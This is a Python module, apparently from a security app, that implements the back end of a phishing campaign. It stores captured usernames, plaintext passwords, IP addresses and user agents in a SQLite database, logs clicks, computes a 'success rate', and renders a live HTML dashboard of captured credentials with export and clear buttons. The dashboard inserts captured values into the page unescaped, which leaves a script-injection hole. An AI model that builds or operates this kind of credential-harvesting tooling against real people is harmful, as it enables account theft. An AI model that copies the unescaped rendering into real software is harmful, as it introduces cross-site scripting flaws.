# --- PHISHING MODULE ---
import datetime
import json

from cyberapp.models.db import db_conn

PHISHING_DB_PATH = "/tmp/phishing_credentials.db"


class PhishingManager:
    def create_campaign(self, name, targets):
        campaign_id = f"camp_{datetime.datetime.utcnow().strftime('%Y%m%d%H%M%S')}"
        return {
            "campaign_id": campaign_id,
            "name": name,
            "targets": targets or [],
        }


class LivePhishingDashboard:
    """WebSocket-style phishing dashboard (simulated)."""

    def __init__(self):
        self.credentials_db = PHISHING_DB_PATH
        self.ws_clients = set()
        self.setup_credential_db()

    def setup_credential_db(self):
        try:
            with db_conn(self.credentials_db) as conn:
                conn.execute(
                    """
                    CREATE TABLE IF NOT EXISTS credentials (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        campaign_id TEXT,
                        username TEXT,
                        password TEXT,
                        ip_address TEXT,
                        user_agent TEXT,
                        timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
                        status TEXT DEFAULT 'NEW'
                    )
                    """
                )

                conn.execute(
                    """
                    CREATE TABLE IF NOT EXISTS clicks (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        campaign_id TEXT,
                        ip_address TEXT,
                        timestamp TEXT DEFAULT CURRENT_TIMESTAMP
                    )
                    """
                )
        except Exception as e:
            print(f"[!] Credential DB setup error: {e}")

    def log_credential(self, campaign_id, username, password, ip_address, user_agent):
        try:
            with db_conn(self.credentials_db) as conn:
                conn.execute(
                    """
                    INSERT INTO credentials (campaign_id, username, password, ip_address, user_agent)
                    VALUES (?, ?, ?, ?, ?)
                    """,
                    (campaign_id, username, password, ip_address, user_agent),
                )
                conn.commit()

            self.broadcast_credential(
                {
                    "type": "new_credential",
                    "campaign_id": campaign_id,
                    "username": username,
                    "password": password,
                    "ip_address": ip_address,
                    "timestamp": datetime.datetime.now().isoformat(),
                }
            )
            return True
        except Exception as e:
            print(f"[!] Credential log error: {e}")
            return False

    def log_click(self, campaign_id, ip_address):
        try:
            with db_conn(self.credentials_db) as conn:
                conn.execute(
                    """
                    INSERT INTO clicks (campaign_id, ip_address)
                    VALUES (?, ?)
                    """,
                    (campaign_id, ip_address),
                )
                conn.commit()

            self.broadcast_credential(
                {
                    "type": "new_click",
                    "campaign_id": campaign_id,
                    "ip_address": ip_address,
                    "timestamp": datetime.datetime.now().isoformat(),
                }
            )
            return True
        except Exception as e:
            print(f"[!] Click log error: {e}")
            return False

    def get_all_credentials(self, campaign_id=None):
        try:
            with db_conn(self.credentials_db) as conn:
                if campaign_id:
                    creds = conn.execute(
                        """
                        SELECT * FROM credentials WHERE campaign_id = ?
                        ORDER BY timestamp DESC
                        """,
                        (campaign_id,),
                    ).fetchall()
                else:
                    creds = conn.execute(
                        """
                        SELECT * FROM credentials ORDER BY timestamp DESC
                        """
                    ).fetchall()
                return creds
        except Exception as e:
            print(f"[!] Get credentials error: {e}")
            return []

    def get_dashboard_stats(self, campaign_id=None):
        try:
            with db_conn(self.credentials_db) as conn:
                if campaign_id:
                    total_creds = conn.execute(
                        """
                        SELECT COUNT(*) FROM credentials WHERE campaign_id = ?
                        """,
                        (campaign_id,),
                    ).fetchone()[0]
                    total_clicks = conn.execute(
                        """
                        SELECT COUNT(*) FROM clicks WHERE campaign_id = ?
                        """,
                        (campaign_id,),
                    ).fetchone()[0]
                else:
                    total_creds = conn.execute(
                        """
                        SELECT COUNT(*) FROM credentials
                        """
                    ).fetchone()[0]
                    total_clicks = conn.execute(
                        """
                        SELECT COUNT(*) FROM clicks
                        """
                    ).fetchone()[0]

            return {
                "total_credentials": total_creds,
                "total_clicks": total_clicks,
                "success_rate": round((total_creds / total_clicks * 100), 2)
                if total_clicks > 0
                else 0,
            }
        except Exception as e:
            print(f"[!] Dashboard stats error: {e}")
            return {"total_credentials": 0, "total_clicks": 0, "success_rate": 0}

    def broadcast_credential(self, data):
        message = json.dumps(data)
        print(f"\n[WEBSOCKET BROADCAST] {message}")
        print(f"[Connected clients: {len(self.ws_clients)}]")

    def create_live_dashboard_html(self, campaign_id):
        stats = self.get_dashboard_stats(campaign_id)
        creds = self.get_all_credentials(campaign_id)

        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Live Phishing Dashboard</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.0/socket.io.min.js"></script>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
    <style>
        :root {{
            --primary: #00ff00;
            --danger: #ff3333;
            --warning: #ffaa00;
            --bg-dark: #0f0f23;
            --bg-card: rgba(30, 30, 46, 0.9);
        }}
        body {{
            background: var(--bg-dark);
            color: #fff;
            font-family: 'Segoe UI', sans-serif;
        }}
        .card {{
            background: var(--bg-card);
            border: 1px solid rgba(0, 255, 0, 0.3);
            border-radius: 10px;
            margin-bottom: 20px;
        }}
        .stat-card {{
            text-align: center;
            padding: 20px;
        }}
        .stat-number {{
            font-size: 2.5em;
            font-weight: bold;
            color: var(--primary);
        }}
        .stat-label {{
            color: #aaa;
            font-size: 0.9em;
        }}
        .credential-table {{
            background: rgba(0, 0, 0, 0.5);
        }}
        .new-credential {{
            animation: flash 1s ease-in-out;
            background: rgba(0, 255, 0, 0.2) !important;
        }}
        @keyframes flash {{
            0% {{ background: rgba(0, 255, 0, 0.8); }}
            100% {{ background: rgba(0, 255, 0, 0.2); }}
        }}
        .live-indicator {{
            display: inline-block;
            width: 10px;
            height: 10px;
            background: #00ff00;
            border-radius: 50%;
            animation: pulse 1s infinite;
        }}
        @keyframes pulse {{
            0% {{ opacity: 1; }}
            50% {{ opacity: 0.5; }}
            100% {{ opacity: 1; }}
        }}
        .console-output {{
            background: #000;
            border: 1px solid #00ff00;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            max-height: 300px;
            overflow-y: auto;
        }}
        .console-line {{
            margin: 5px 0;
            padding: 5px;
            border-left: 3px solid #00ff00;
        }}
        .console-line.credential {{
            border-left-color: #ff00ff;
            background: rgba(255, 0, 255, 0.1);
        }}
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg" style="background: rgba(0, 0, 0, 0.9); border-bottom: 1px solid #00ff00;">
        <div class="container-fluid">
            <a class="navbar-brand text-primary" href="#">
                <i class="bi bi-broadcast"></i> LIVE PHISHING DASHBOARD
            </a>
            <span class="navbar-text">
                <span class="live-indicator"></span> LIVE
            </span>
        </div>
    </nav>

    <div class="container-fluid mt-4">
        <div class="row">
            <div class="col-lg-8">
                <div class="card">
                    <div class="card-body">
                        <h4 class="card-title">
                            <i class="bi bi-key"></i> Captured Credentials
                            <span class="badge bg-primary float-end">{stats['total_credentials']} Total</span>
                        </h4>
                        <div class="table-responsive">
                            <table class="table table-dark table-hover" id="credentialsTable">
                                <thead>
                                    <tr>
                                        <th>Time</th>
                                        <th>Username</th>
                                        <th>Password</th>
                                        <th>IP Address</th>
                                        <th>User Agent</th>
                                        <th>Status</th>
                                    </tr>
                                </thead>
                                <tbody id="credentialsBody">
                                    {''.join([f'''
                                    <tr>
                                        <td><small>{c[7]}</small></td>
                                        <td><code>{c[2]}</code></td>
                                        <td><code>{c[3]}</code></td>
                                        <td>{c[4]}</td>
                                        <td><small>{c[5][:30]}...</small></td>
                                        <td><span class="badge bg-success">CAPTURED</span></td>
                                    </tr>
                                    ''' for c in creds]) if creds else '<tr><td colspan="6" class="text-center text-muted">No credentials captured yet</td></tr>'}
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>

                <div class="card">
                    <div class="card-body">
                        <h4 class="card-title">
                            <i class="bi bi-terminal"></i> Live Console
                        </h4>
                        <div class="console-output" id="consoleOutput">
                            <div class="console-line">
                                <span class="text-muted">[{datetime.datetime.now().strftime('%H:%M:%S')}]</span>
                                <span class="text-success">System initialized. Waiting for connections...</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="col-lg-4">
                <div class="card">
                    <div class="card-body">
                        <h4 class="card-title">
                            <i class="bi bi-bar-chart"></i> Campaign Statistics
                        </h4>
                        <div class="row">
                            <div class="col-6">
                                <div class="stat-card">
                                    <div class="stat-number">{stats['total_clicks']}</div>
                                    <div class="stat-label">Total Clicks</div>
                                </div>
                            </div>
                            <div class="col-6">
                                <div class="stat-card">
                                    <div class="stat-number">{stats['total_credentials']}</div>
                                    <div class="stat-label">Credentials</div>
                                </div>
                            </div>
                        </div>
                        <div class="text-center mt-3">
                            <h5 class="text-warning">Success Rate: {stats['success_rate']}%</h5>
                        </div>
                        <div class="progress mt-2" style="height: 20px;">
                            <div class="progress-bar bg-success" style="width: {stats['success_rate']}%"></div>
                            <div class="progress-bar bg-warning" style="width: {100-stats['success_rate']}%"></div>
                        </div>
                    </div>
                </div>

                <div class="card">
                    <div class="card-body">
                        <h4 class="card-title">
                            <i class="bi bi-info-circle"></i> Campaign Info
                        </h4>
                        <div class="mb-2">
                            <small class="text-muted">Campaign ID:</small>
                            <code class="float-end">{campaign_id}</code>
                        </div>
                        <div class="mb-2">
                            <small class="text-muted">Status:</small>
                            <span class="badge bg-success float-end">ACTIVE</span>
                        </div>
                        <div class="mb-2">
                            <small class="text-muted">Started:</small>
                            <span class="float-end">{datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}</span>
                        </div>
                    </div>
                </div>

                <div class="card">
                    <div class="card-body">
                        <h4 class="card-title">
                            <i class="bi bi-lightning"></i> Quick Actions
                        </h4>
                        <div class="d-grid gap-2">
                            <button class="btn btn-outline-warning" onclick="exportCredentials()">
                                <i class="bi bi-download"></i> Export CSV
                            </button>
                            <button class="btn btn-outline-danger" onclick="clearCredentials()">
                                <i class="bi bi-trash"></i> Clear All
                            </button>
                            <button class="btn btn-outline-primary" onclick="refreshDashboard()">
                                <i class="bi bi-arrow-clockwise"></i> Refresh
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const campaignId = "{campaign_id}";

        function addConsoleMessage(message, type = 'info') {{
            const consoleOutput = document.getElementById('consoleOutput');
            const line = document.createElement('div');
            line.className = 'console-line ' + type;
            line.innerHTML = '<span class="text-muted">[' + new Date().toLocaleTimeString() + ']</span> <span class="text-' + (type === 'credential' ? 'warning' : 'success') + '">' + message + '</span>';
            consoleOutput.appendChild(line);
            consoleOutput.scrollTop = consoleOutput.scrollHeight;
        }}

        function addCredentialRow(data) {{
            const tbody = document.getElementById('credentialsBody');
            const row = document.createElement('tr');
            row.className = 'new-credential';
            row.innerHTML = '<td><small>' + new Date().toLocaleString() + '</small></td>' +
                           '<td><code>' + data.username + '</code></td>' +
                           '<td><code>' + data.password + '</code></td>' +
                           '<td>' + data.ip_address + '</td>' +
                           '<td><small>Browser</small></td>' +
                           '<td><span class="badge bg-success">NEW</span></td>';
            tbody.insertBefore(row, tbody.firstChild);

            setTimeout(() => row.classList.remove('new-credential'), 1000);
        }}

        function updateStats(stats) {{
            document.querySelectorAll('.stat-number')[0].textContent = stats.total_clicks;
            document.querySelectorAll('.stat-number')[1].textContent = stats.total_credentials;
        }}

        function exportCredentials() {{
            window.location.href = '/phishing/export/' + campaignId;
        }}

        function clearCredentials() {{
            if(confirm('Are you sure you want to clear all credentials?')) {{
                fetch('/phishing/clear/' + campaignId, {{ method: 'POST' }})
                    .then(r => r.json())
                    .then(data => {{
                        if(data.status === 'success') {{
                            location.reload();
                        }}
                    }});
            }}
        }}

        function refreshDashboard() {{
            location.reload();
        }}

        setInterval(() => {{
            fetch('/phishing/stats/' + campaignId)
                .then(r => r.json())
                .then(stats => updateStats(stats));
        }}, 5000);

        addConsoleMessage('Connected to live feed', 'info');
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
        """
        return html
